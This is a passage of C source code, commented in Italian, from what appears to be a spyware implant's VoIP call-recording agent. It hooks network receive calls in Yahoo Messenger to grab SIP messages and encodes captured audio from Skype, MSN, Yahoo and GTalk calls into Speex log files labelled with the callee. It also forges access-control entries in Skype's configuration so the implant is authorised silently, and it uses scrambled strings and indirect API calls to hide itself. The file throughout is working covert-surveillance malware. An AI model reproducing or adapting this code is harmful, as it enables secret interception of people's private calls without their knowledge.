	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
	if (!Active || !(*Active))
		return ret_code;

	if(lpNumberOfBytesRecvd) {
		msg_len = *lpNumberOfBytesRecvd;
		buf = lpBuffers[0].buf;
		if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_IN, IPC_HI_PRIORITY);
	}

	return ret_code;
}

DWORD PM_WSARecv_setup(HMServiceStruct *pData)
{
	char proc_path[DLLNAMELEN];
	char *proc_name;

	// Verifica autonomamente se si tratta di un programma da hookare
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');
	if (proc_name) {
		proc_name++;
		if (stricmp(proc_name, "YahooMessenger.exe"))
			return 1; // Hooka solo YahooMessenger
	} else{
		return 1;
	}

	WSARecvData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	WSARecvData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	WSARecvData.dwHookLen = 900;
	return 0;
}



// Inserisce un campione nell'array (i campioni arrivano gia' ordinati dalla coda IPC)
BOOL InsertList(BYTE *channel_array, BYTE *sample, DWORD sample_len, DWORD offset)
{
	// Inserisce solo messaggi contenenti dati
	if (sample_len==0 || !channel_array)
		return FALSE;

	memcpy(channel_array + offset, sample, sample_len);
	return TRUE;
}

// Salva la lista come file encodato
#define SPEEX_FREE	{rel_speex_encoder_destroy(state); rel_speex_bits_destroy(&bits);}
void SaveEncode(BYTE *source, DWORD total_size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len)
{
#define MODE_UWB 2
	DWORD SAMPLE_SIZE = 2;
	short *bit_sample;
	float *bit_sample_float;
	void *state;
	float *input;
	BYTE *to_write;
	BYTE *source_ptr;
	BYTE *cbits;
	SpeexBits bits;
	DWORD frame_size = 0;
	DWORD i, nbBytes;	
	DWORD complexity = 1;
	HANDLE hf;

	// Crea un nuovo encoder in wide mode*/
	state = rel_speex_encoder_init(rel_speex_lib_get_mode(MODE_UWB));
	rel_speex_encoder_ctl(state, SPEEX_SET_QUALITY, &compress_factor);
	rel_speex_encoder_ctl(state, SPEEX_SET_COMPLEXITY, &complexity);
	rel_speex_bits_init(&bits);
	rel_speex_encoder_ctl(state, SPEEX_GET_FRAME_SIZE, &frame_size);

	// Allochiamo un buffer per tutta la sequenza di campioni
	if (!frame_size) {
		SPEEX_FREE;
		return;
	}

	// Allochiamo il buffer di output grande quanto quello originale (per sicurezza)
	if (!(to_write = (BYTE *)malloc(frame_size*SAMPLE_SIZE + sizeof(DWORD)))) {
		SPEEX_FREE;
		return;
	}
	cbits = to_write + sizeof(DWORD); // Punta al blocco dati, mentre la prima DWORD conterra' la dimensione
	// Allochiamo il buffer di elaborazione
	if (!(input = (float *)malloc(frame_size*sizeof(float)))) {
		SAFE_FREE(to_write);
		SPEEX_FREE;
		return;
	}

	// XXX Fix per scalare a 16KHz l'output di MSN che e' a 48KHz
	if (additional_data->uProgramType == VOIP_MSMSG+0x140 && additional_data->uChannel == OUTPUT_ELEM)
		channels *= 3;

	if (additional_data->uProgramType == VOIP_MSNWS+0x140)
		SAMPLE_SIZE = 4;

	hf = Log_CreateFile(PM_VOIPRECORDAGENT, (BYTE *)additional_data, additional_len);
	// Continua finche' dopo source_ptr non rimane ancora spazio per un frame intero
	for (source_ptr=source; source_ptr+(frame_size*SAMPLE_SIZE*channels)<=source+total_size; source_ptr+=(frame_size*SAMPLE_SIZE*channels)) {
		// Copiamo i campioni a 16 bit dentro dei float
		bit_sample = (short *)source_ptr;
		bit_sample_float = (float *)source_ptr;
		// MSN Wasapi usa la codifica float
		if (additional_data->uProgramType == VOIP_MSNWS+0x140) {
			for (i=0; i<frame_size; i++)
				// Equalizza i pcm attenuando il segnale di circa 1.2 Db 
				//(per evitare il clipping dei GSM con speex)
				input[i] =  bit_sample_float[i*channels] * 32000;

		} else {
			for (i=0; i<frame_size; i++)
				// Equalizza i pcm attenuando il segnale di circa 1.2 Db 
				//(per evitare il clipping dei GSM con speex)
				input[i] =  bit_sample[i*channels] - (bit_sample[i*channels]/4);
		}

		rel_speex_bits_reset(&bits);
		rel_speex_encode(state, input, &bits);
		// Encoda dentro il buffer di output
		nbBytes = rel_speex_bits_write(&bits, (char *)cbits, frame_size*SAMPLE_SIZE);
		if (nbBytes > (frame_size*SAMPLE_SIZE))
			continue; // Check paranoico
		// Copia la lunghezza nei primi 4 byte per fare un unica scrittura su file
		memcpy(to_write, &nbBytes, sizeof(DWORD)); 
		Log_WriteFile(hf, to_write, nbBytes+sizeof(DWORD));
	}
   
	Log_CloseFile(hf);
	SAFE_FREE(to_write);
	SAFE_FREE(input);
	SPEEX_FREE;
}


// Salva la lista come wav
void SaveWav(BYTE *channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len)
{
	static BOOL first_save = TRUE;
	ScrambleString ss1("_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n", is_demo_version); // "- Initializing audio codec......OK\r\n\r\n"
	ScrambleString ss2("_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n", is_demo_version); // "- Initializing audio codec......ERROR\r\n\r\n"

	// Verifica che l'array sia stato allocato
	if (!channel_array)
		return;

	// Solo a scopi di DEMO
	if (first_save) {
		first_save = FALSE;
		if (codec_handle)
			REPORT_STATUS_LOG(ss1.get_str());
		else
			REPORT_STATUS_LOG(ss2.get_str());
	} 
	
	// Se abbimo la DLL del codec, salva in modo compresso
	if (codec_handle) {
		SaveEncode(channel_array, size, channels, additional_data, additional_len);
		return;
	}
}


// Carica (se risce) la DLL del codec e risolve tutti i simboli utilizzati
#define RESOLVE_ERROR { FreeLibrary(hcodec); return NULL; }
HMODULE ResolveCodecSymbols(char *name)
{
	HMODULE hcodec;
	if ( !(hcodec = LoadLibrary(name)))
		return NULL;

	if (! (rel_speex_encoder_init = (speex_encoder_init_t)GetProcAddress(hcodec, "speex_encoder_init")) ) RESOLVE_ERROR;
	if (! (rel_speex_encoder_ctl = (speex_encoder_ctl_t)GetProcAddress(hcodec, "speex_encoder_ctl")) ) RESOLVE_ERROR;
	if (! (rel_speex_encoder_destroy = (speex_encoder_destroy_t)GetProcAddress(hcodec, "speex_encoder_destroy")) ) RESOLVE_ERROR;
	if (! (rel_speex_encode = (speex_encode_t)GetProcAddress(hcodec, "speex_encode")) ) RESOLVE_ERROR;
	if (! (rel_speex_bits_init = (speex_bits_init_t)GetProcAddress(hcodec, "speex_bits_init")) ) RESOLVE_ERROR;
	if (! (rel_speex_bits_reset = (speex_bits_reset_t)GetProcAddress(hcodec, "speex_bits_reset")) ) RESOLVE_ERROR;
	if (! (rel_speex_bits_write = (speex_bits_write_t)GetProcAddress(hcodec, "speex_bits_write")) ) RESOLVE_ERROR;
	if (! (rel_speex_bits_destroy = (speex_bits_destroy_t)GetProcAddress(hcodec, "speex_bits_destroy")) ) RESOLVE_ERROR;
	if (! (rel_speex_lib_get_mode = (speex_lib_get_mode_t)GetProcAddress(hcodec, "speex_lib_get_mode")) ) RESOLVE_ERROR;	

	return hcodec;
}


// Ritorna l'additional data da inserire nel file
// NON e' thread safe (tanto la richiamo solo da una funzione)
#define MAX_PEER_LEN 500
pVoiceAdditionalData VoipGetAdditionalData(partner_entry *partner_list, DWORD in_out, DWORD *add_len)
{
	static BYTE additional_data[sizeof(VoiceAdditionalData)+(MAX_PEER_LEN*2*sizeof(WCHAR))];
	pVoiceAdditionalData voip_header = (pVoiceAdditionalData)additional_data;
	WCHAR *peer_string = (WCHAR *)(voip_header+1);

	if (add_len)
		*add_len = 0;
	memset(additional_data, 0, sizeof(additional_data));
	voip_header->uVersion = LOG_VOICE_VERSION;
	voip_header->uIngoing = 0;
	voip_header->uChannel = in_out;
	if (partner_list)
		voip_header->uProgramType = partner_list->voip_program + 0x140;
	else 
		voip_header->uProgramType = 0;
	memcpy(&(voip_header->start), &(channel_time_start[in_out]), sizeof(FILETIME));
	memcpy(&(voip_header->stop), &(channel_time_last[in_out]), sizeof(FILETIME));
	voip_header->uCallerIdLen = 0;

	if (partner_list) {
		switch (partner_list->voip_program) {
			case VOIP_MSMSG: voip_header->uSampleRate = SAMPLE_RATE_MSN; break;
			case VOIP_YAHOO: 
				if (in_out == 0)
					voip_header->uSampleRate = SAMPLE_RATE_YMSG; 
				else
					voip_header->uSampleRate = SAMPLE_RATE_YMSG_IN; 
				break;
			case VOIP_SKYPE: voip_header->uSampleRate = SAMPLE_RATE_SKYPE; break;
			case VOIP_GTALK: voip_header->uSampleRate = SAMPLE_RATE_GTALK; break;
			case VOIP_MSNWS: voip_header->uSampleRate = sample_sampling[in_out]; break;
			case VOIP_SKWSA: voip_header->uSampleRate = sample_sampling[in_out]; break;
			default: voip_header->uSampleRate = SAMPLE_RATE_DEFAULT;
		}
	} else 
		voip_header->uSampleRate = SAMPLE_RATE_DEFAULT;

	peer_string[0] = 0;
	for (; partner_list; partner_list=partner_list->next) {
		if (partner_list->peer) {
			if (peer_string[0])
				_snwprintf_s(peer_string, MAX_PEER_LEN, _TRUNCATE, L"%s,%S", peer_string, partner_list->peer);
			else
				_snwprintf_s(peer_string, MAX_PEER_LEN, _TRUNCATE, L"%S", partner_list->peer);
			/*if (partner_list->participants==0)
				_snwprintf_s(peer_string, MAX_PEER_LEN, _TRUNCATE, L"%s %S", peer_string, partner_list->peer);
			else
				_snwprintf_s(peer_string, MAX_PEER_LEN, _TRUNCATE, L"%s %S(+%d)", peer_string, partner_list->peer, partner_list->participants);*/
		}
	}
	voip_header->uCalleeIdLen = wcslen(peer_string) * sizeof(WCHAR);
	if (add_len)
		*add_len = sizeof(VoiceAdditionalData) + voip_header->uCalleeIdLen + voip_header->uCallerIdLen;

	return voip_header;
}


// Calcola la differenza fra due FILETIME in decimi di secondo
int TimeDiff(FILETIME *elem_1, FILETIME *elem_2)
{
	long long elem64_1=0, elem64_2=0;
	int diff;

	elem64_1 = elem_1->dwHighDateTime; elem64_1<<=32;
	elem64_2 = elem_2->dwHighDateTime; elem64_2<<=32;
	elem64_1 += elem_1->dwLowDateTime;
	elem64_2 += elem_2->dwLowDateTime;
	elem64_1 -= elem64_2;
	elem64_1 /= 1000000;
	diff = (int) elem64_1;

	return diff;
}

void EndCall()
{
	DWORD i, marker = 0xFFFFFFFF;
	HANDLE hf;
	pVoiceAdditionalData additional_data;
	DWORD additional_len;
	// Salva code pendenti (se presenti) di una precedente chiamata
	for (i=0; i<2; i++) {
		if (sample_size[i]>0) {
			additional_data = VoipGetAdditionalData(call_list_head, i, &additional_len);
			SaveWav(wave_array[i], sample_size[i], sample_channels[i], additional_data, additional_len);
			sample_size[i] = 0;
		}
	}

	for (i=0; i<2; i++) {
		// Aggiunge il chunk di fine chiamata
		// Forza la marcatura temporale alla fine dell'ultimo chunk della chiamata
		channel_time_start[i].dwHighDateTime = channel_time_last[i].dwHighDateTime;
		channel_time_start[i].dwLowDateTime = channel_time_last[i].dwLowDateTime;
		additional_data = VoipGetAdditionalData(call_list_head, i, &additional_len);
		hf = Log_CreateFile(PM_VOIPRECORDAGENT, (BYTE *)additional_data, additional_len);
		Log_WriteFile(hf, (BYTE *)&marker, sizeof(DWORD));
		Log_CloseFile(hf);
	}
	
	return ;
}

// NULL termina la stringa nella coda IPC
void NullTerminatePacket(DWORD len, BYTE *msg)
{
	if ( len <= (MAX_MSG_LEN-1) )
		msg[len] = 0;
	else
		msg[(MAX_MSG_LEN-1)] = 0;
}

// Libera la lista degli interlocutori
void FreePartnerList(partner_entry **head) 
{
	partner_entry *tmp_partner;
	partner_entry *curr_partner = *head;

	while (curr_partner) {
		tmp_partner = curr_partner->next;
		SAFE_FREE(curr_partner->peer);
		SAFE_FREE(curr_partner);
		curr_partner = tmp_partner;
	}	
	*head = NULL;
}

// Puo' essere richiamata solo da dentro il processo di skype (uno dei suoi setup degli hook)
BOOL IsSkypePMInstalled()
{
	WCHAR skype_path[MAX_PATH];
	WCHAR *skype_pm_ptr;
	WCHAR skype_pm_path[MAX_PATH];
	HANDLE fileh;

	if (FNC(GetModuleFileNameExW)(FNC(GetCurrentProcess)(), NULL, skype_path, sizeof(skype_path)/sizeof(WCHAR))) {
		if (skype_pm_ptr = wcsstr(skype_path, L"\\Phone\\")) {
			*skype_pm_ptr = 0;
			_snwprintf_s(skype_pm_path, sizeof(skype_pm_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\Plugin Manager\\skypePM.exe", skype_path);		
			fileh = FNC(CreateFileW)(skype_pm_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
			if (fileh == INVALID_HANDLE_VALUE)
				return FALSE;

			CloseHandle(fileh);
			return TRUE;
		}
	}
	return FALSE;
}

#define GENERIC_FIELD_LEN MAX_PATH*2
// Usabile solo in questo caso, perche' potrebbe tornare dei campi inesistenti
// ma tanto al fine dei nostri check poco ci interessa leggere dei campi in piu' 
// con valori NULL
char *GetXMLNodeA(char *data, char *node, char *buffer)
{
	char *ptr1, *ptr2, *ret_val;
	char saved_char;
	memset(buffer, 0, GENERIC_FIELD_LEN);
	if (data == NULL)
		return NULL;
	if ( !(ptr1 = strstr(data, node)) )
		return NULL;
	ret_val = ptr1;
	if ( !(ptr1 = strchr(ptr1, L'>')) )
		return NULL;
	if ( !(ptr2 = strchr(ptr1, L'<')) )
		return NULL;
	saved_char = *ptr2;
	ptr1++; *ptr2 = 0;
	strncpy_s(buffer, GENERIC_FIELD_LEN, ptr1, _TRUNCATE);
	*ptr2 = saved_char;
	return ret_val;	
}

//// Verifica se l'ACL nel file corrisponde alla nostra
//BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
//{
//	if (/*!stricmp(key1, m_key1) &&*/ !stricmp(key2, m_key2) && !stricmp(key3, m_key3) && !stricmp(key4, m_key4)/* && !stricmp(path, m_path)*/)
//		return TRUE;
//	return FALSE;
//}

DWORD RapidGetFileSize(HANDLE hfile)
{
	LARGE_INTEGER li;
	li.LowPart = INVALID_FILE_SIZE;
	if (!GetFileSizeEx(hfile, &li))
		return INVALID_FILE_SIZE;
	return li.LowPart;
}

// Verifica se nel file di config c'e' la nostra ACL
// Se non riesce ad aprire il file, torna che l'acl c'e'. Altrimenti potrebbe scriverla piu' volte...tanto poi non riuscirebbe comunque a scriverla
BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
{
	HANDLE hFile;
	HANDLE hMap;
	DWORD config_size;
	char *config_map;
	char *local_config_map, *ptr, *ptr_k;
	BOOL acl_found = FALSE;
	char key1[GENERIC_FIELD_LEN], key2[GENERIC_FIELD_LEN], key3[GENERIC_FIELD_LEN], key4[GENERIC_FIELD_LEN], path[GENERIC_FIELD_LEN];

	// Mappa in memoria il file di config
	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return TRUE;
	
	config_size = RapidGetFileSize(hFile);
	if (config_size == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return TRUE;
	}
	
	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
	if (local_config_map == NULL) {
		CloseHandle(hFile);
		return TRUE;
	}

	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return TRUE;
	}

	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
		memcpy(local_config_map, config_map, config_size);
		FNC(UnmapViewOfFile)(config_map);
		ptr = local_config_map;
		// Vede se ce una chiave che matcha
		/*while (ptr = GetXMLNodeA(ptr, "Key1", key1)) {
			ptr_k = GetXMLNodeA(ptr, "Key2", key2);
			ptr_k = GetXMLNodeA(ptr_k, "Key3", key3);
			ptr_k = GetXMLNodeA(ptr_k, "Key4", key4);
			ptr_k = GetXMLNodeA(ptr_k, "Path", path);
			if (!ptr_k)
				break; // Se non ci sono piu' nemmeno un Key2,3,4 e Path e' inutile continuare a cercare
			if (CheckACL(key1, key2, key3, key4, path, m_key1, m_key2, m_key3, m_key4, m_path)) {
				acl_found = TRUE;
				break;
			}
			ptr++;
		}*/
		if (strstr(ptr, "<Client97>") || strstr(ptr, "<Client98>")) 
			acl_found = TRUE;
	}
	SAFE_FREE(local_config_map);
	CloseHandle(hMap);
	CloseHandle(hFile);

	return acl_found;
}

// Scriva la nostra ACL nel file di config
BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *key5, char *key6, char *path, BOOL isOld)
{
	HANDLE hFile;
	HANDLE hMap;
	DWORD config_size, first_part_size;
	char *config_map;
	char *local_config_map, *ptr = NULL;
	BOOL acl_missing = FALSE, c_missing = FALSE;
	DWORD dummy;

	// Fa una copia del file in memoria
	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return FALSE;
	
	config_size = RapidGetFileSize(hFile);
	if (config_size == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return FALSE;
	}
	
	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
	if (local_config_map == NULL) {
		CloseHandle(hFile);
		return FALSE;
	}

	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return FALSE;
	}

	if (! (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
		SAFE_FREE(local_config_map);
		CloseHandle(hMap);
		CloseHandle(hFile);
		return FALSE;
	}

	memcpy(local_config_map, config_map, config_size);
	FNC(UnmapViewOfFile)(config_map);
	CloseHandle(hMap);
	
	// Vede se manca la sezione <AccessContrlList>
	if (!(ptr = strstr(local_config_map, "</AccessControlList>"))) {
		acl_missing = TRUE;
		ptr = strstr(local_config_map, "</C>");
		if (!ptr) {
			c_missing = TRUE;
			ptr = strstr(local_config_map, "</UI>");
		}
	}
	if (!ptr) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return FALSE;
	}

	// Svuota il contenuto del file
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

	first_part_size = ptr - local_config_map;
	WriteFile(hFile, local_config_map, first_part_size, &dummy, NULL);
	if (c_missing)
		WriteFile(hFile, "<C>\r\n", strlen("<C>\r\n"), &dummy, NULL);
	if (acl_missing)
		WriteFile(hFile, "<AccessControlList>\r\n", strlen("<AccessControlList>\r\n"), &dummy, NULL);
	if (!isOld)
		WriteFile(hFile, "<Client97>\r\n<Key1>", strlen("<Client97>\r\n<Key1>"), &dummy, NULL);
	else
		WriteFile(hFile, "<Client98>\r\n<Key1>", strlen("<Client98>\r\n<Key1>"), &dummy, NULL);
	WriteFile(hFile, key1, strlen(key1), &dummy, NULL);
	WriteFile(hFile, "</Key1>\r\n", strlen("</Key1>\r\n"), &dummy, NULL);
	WriteFile(hFile, "<Key2>", strlen("<Key2>"), &dummy, NULL);
	WriteFile(hFile, key2, strlen(key2), &dummy, NULL);
	WriteFile(hFile, "</Key2>\r\n", strlen("</Key2>\r\n"), &dummy, NULL);
	WriteFile(hFile, "<Key3>", strlen("<Key3>"), &dummy, NULL);
	WriteFile(hFile, key3, strlen(key3), &dummy, NULL);
	WriteFile(hFile, "</Key3>\r\n", strlen("</Key3>\r\n"), &dummy, NULL);
	WriteFile(hFile, "<Key4>", strlen("<Key4>"), &dummy, NULL);
	WriteFile(hFile, key4, strlen(key4), &dummy, NULL);
	WriteFile(hFile, "</Key4>\r\n", strlen("</Key4>\r\n"), &dummy, NULL);
	WriteFile(hFile, "<Key5>", strlen("<Key5>"), &dummy, NULL);
	WriteFile(hFile, key5, strlen(key5), &dummy, NULL);
	WriteFile(hFile, "</Key5>\r\n", strlen("</Key5>\r\n"), &dummy, NULL);
	WriteFile(hFile, "<Key6>", strlen("<Key6>"), &dummy, NULL);
	WriteFile(hFile, key6, strlen(key6), &dummy, NULL);
	WriteFile(hFile, "</Key6>\r\n", strlen("</Key6>\r\n"), &dummy, NULL);

	WriteFile(hFile, "<Path>", strlen("<Path>"), &dummy, NULL);
	WriteFile(hFile, path, strlen(path), &dummy, NULL);
	if (!isOld)
		WriteFile(hFile, "</Path>\r\n</Client97>\r\n", strlen("</Path>\r\n</Client97>\r\n"), &dummy, NULL);
	else
		WriteFile(hFile, "</Path>\r\n</Client98>\r\n", strlen("</Path>\r\n</Client98>\r\n"), &dummy, NULL);
	if (acl_missing)
		WriteFile(hFile, "</AccessControlList>\r\n", strlen("</AccessControlList>\r\n"), &dummy, NULL);
	if (c_missing)
		WriteFile(hFile, "</C>\r\n", strlen("</C>\r\n"), &dummy, NULL);
	if (!WriteFile(hFile, ptr, config_size - first_part_size, &dummy, NULL)) {
		SetEndOfFile(hFile);
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return FALSE;
	}

	SetEndOfFile(hFile);
	SAFE_FREE(local_config_map);
	CloseHandle(hFile);
	return TRUE;
}


// Torna TRUE se e' precedente alla 5.5.0.X
BOOL IsOldSkypeVersion(WCHAR *config_path)
{
	HANDLE hFile;
	HANDLE hMap;
	DWORD config_size;
	char *config_map;
	char *local_config_map, *ptr = NULL;

	// Fa una copia del file in memoria
	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return FALSE;
	
	config_size = GetFileSize(hFile, NULL);
	if (config_size == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return FALSE;
	}

	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
	if (local_config_map == NULL) {
		CloseHandle(hFile);
		return FALSE;
	}

	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return FALSE;
	}

	if (! (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
		SAFE_FREE(local_config_map);
		CloseHandle(hMap);
		CloseHandle(hFile);
		return FALSE;
	}

	memcpy(local_config_map, config_map, config_size);
	FNC(UnmapViewOfFile)(config_map);
	CloseHandle(hMap);
	
	// Vede se manca la sezione <AccessContrlList>
	if (strstr(local_config_map, "<LastWhatsNewGuideVersionStr>5.3.0.")) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return TRUE;
	}

	SAFE_FREE(local_config_map);
	CloseHandle(hFile);
	return FALSE;
}


extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutKey5, char *lpOutKey6, char *lpOutPath, BOOL isOld);
BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_key5, char *m_key6, char *m_path, BOOL isOld)
{
	char c_user_name[MAX_PATH];
	char c_file_path[MAX_PATH];

	sprintf_s(c_user_name, MAX_PATH, "%S", user_name);
	sprintf_s(c_file_path, MAX_PATH, "%S", file_path);

	ZeroMemory(m_key1, MAX_HASHKEY_LEN);
	ZeroMemory(m_key2, MAX_HASHKEY_LEN);
	ZeroMemory(m_key3, MAX_HASHKEY_LEN);
	ZeroMemory(m_key4, MAX_HASHKEY_LEN);
	ZeroMemory(m_key5, MAX_HASHKEY_LEN);
	ZeroMemory(m_key6, MAX_HASHKEY_LEN);
	ZeroMemory(m_path, MAX_HASHKEY_LEN);

	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld);
}

// Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_key5, char *m_key6, char *m_path, BOOL isOld)
{
	typedef struct {
		WCHAR user_name[MAX_PATH];
		char m_key1[MAX_HASHKEY_LEN];
		char m_key2[MAX_HASHKEY_LEN];
		char m_key3[MAX_HASHKEY_LEN];
		char m_key4[MAX_HASHKEY_LEN];
		char m_key5[MAX_HASHKEY_LEN];
		char m_key6[MAX_HASHKEY_LEN];
		char m_path[MAX_HASHKEY_LEN];
	} user_hash_struct;

	static user_hash_struct *user_hash_array_old = NULL;
	static DWORD user_hash_size_old = 0;
	static user_hash_struct *user_hash_array_new = NULL;
	static DWORD user_hash_size_new = 0;

	user_hash_struct *tmp_ptr = NULL;
	DWORD i;

	if (isOld) {
		for (i=0; i<user_hash_size_old && user_hash_array_old; i++) {
			if (!wcscmp(user_hash_array_old[i].user_name, user_name)) {
				memcpy(m_key1, user_hash_array_old[i].m_key1, MAX_HASHKEY_LEN);
				memcpy(m_key2, user_hash_array_old[i].m_key2, MAX_HASHKEY_LEN);
				memcpy(m_key3, user_hash_array_old[i].m_key3, MAX_HASHKEY_LEN);
				memcpy(m_key4, user_hash_array_old[i].m_key4, MAX_HASHKEY_LEN);
				memcpy(m_key5, user_hash_array_old[i].m_key5, MAX_HASHKEY_LEN);
				memcpy(m_key6, user_hash_array_old[i].m_key6, MAX_HASHKEY_LEN);
				memcpy(m_path, user_hash_array_old[i].m_path, MAX_HASHKEY_LEN);
				return TRUE;
			}
		}
	} else {
		for (i=0; i<user_hash_size_new && user_hash_array_new; i++) {
			if (!wcscmp(user_hash_array_new[i].user_name, user_name)) {
				memcpy(m_key1, user_hash_array_new[i].m_key1, MAX_HASHKEY_LEN);
				memcpy(m_key2, user_hash_array_new[i].m_key2, MAX_HASHKEY_LEN);
				memcpy(m_key3, user_hash_array_new[i].m_key3, MAX_HASHKEY_LEN);
				memcpy(m_key4, user_hash_array_new[i].m_key4, MAX_HASHKEY_LEN);
				memcpy(m_key5, user_hash_array_new[i].m_key5, MAX_HASHKEY_LEN);
				memcpy(m_key6, user_hash_array_new[i].m_key6, MAX_HASHKEY_LEN);
				memcpy(m_path, user_hash_array_new[i].m_path, MAX_HASHKEY_LEN);
				return TRUE;
			}
		}
	}

	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
		return FALSE;

	if (isOld) {
		if ( !(tmp_ptr = (user_hash_struct *)realloc(user_hash_array_old, (user_hash_size_old+1)*sizeof(user_hash_struct))) )
			return TRUE;
		user_hash_array_old = tmp_ptr;
		memcpy(user_hash_array_old[user_hash_size_old].user_name, user_name, sizeof(user_hash_array_old[user_hash_size_old].user_name));
		memcpy(user_hash_array_old[user_hash_size_old].m_key1, m_key1, sizeof(user_hash_array_old[user_hash_size_old].m_key1));
		memcpy(user_hash_array_old[user_hash_size_old].m_key2, m_key2, sizeof(user_hash_array_old[user_hash_size_old].m_key2));
		memcpy(user_hash_array_old[user_hash_size_old].m_key3, m_key3, sizeof(user_hash_array_old[user_hash_size_old].m_key3));
		memcpy(user_hash_array_old[user_hash_size_old].m_key4, m_key4, sizeof(user_hash_array_old[user_hash_size_old].m_key4));
		memcpy(user_hash_array_old[user_hash_size_old].m_key5, m_key5, sizeof(user_hash_array_old[user_hash_size_old].m_key5));
		memcpy(user_hash_array_old[user_hash_size_old].m_key6, m_key6, sizeof(user_hash_array_old[user_hash_size_old].m_key6));
		memcpy(user_hash_array_old[user_hash_size_old].m_path, m_path, sizeof(user_hash_array_old[user_hash_size_old].m_path));
		user_hash_size_old++;
	} else {
		if ( !(tmp_ptr = (user_hash_struct *)realloc(user_hash_array_new, (user_hash_size_new+1)*sizeof(user_hash_struct))) )
			return TRUE;
		user_hash_array_new = tmp_ptr;
		memcpy(user_hash_array_new[user_hash_size_new].user_name, user_name, sizeof(user_hash_array_new[user_hash_size_new].user_name));
		memcpy(user_hash_array_new[user_hash_size_new].m_key1, m_key1, sizeof(user_hash_array_new[user_hash_size_new].m_key1));
		memcpy(user_hash_array_new[user_hash_size_new].m_key2, m_key2, sizeof(user_hash_array_new[user_hash_size_new].m_key2));
		memcpy(user_hash_array_new[user_hash_size_new].m_key3, m_key3, sizeof(user_hash_array_new[user_hash_size_new].m_key3));
		memcpy(user_hash_array_new[user_hash_size_new].m_key4, m_key4, sizeof(user_hash_array_new[user_hash_size_new].m_key4));
		memcpy(user_hash_array_new[user_hash_size_new].m_key5, m_key5, sizeof(user_hash_array_new[user_hash_size_new].m_key5));
		memcpy(user_hash_array_new[user_hash_size_new].m_key6, m_key6, sizeof(user_hash_array_new[user_hash_size_new].m_key6));
		memcpy(user_hash_array_new[user_hash_size_new].m_path, m_path, sizeof(user_hash_array_new[user_hash_size_new].m_path));
		user_hash_size_new++;
	}

	return TRUE;
}

void StartSkypeAsUser(char *skype_exe_path, STARTUPINFO* si, PROCESS_INFORMATION *pi)
{
	HANDLE hToken;
	if (hToken = GetMediumLevelToken()) {
		HM_CreateProcessAsUser(skype_exe_path, 0, si, pi, 0, hToken);
		CloseHandle(hToken);
	}
}

void SKypeNameConvert(WCHAR *path, WCHAR *user_name, DWORD size)
{
	WCHAR *ptr;
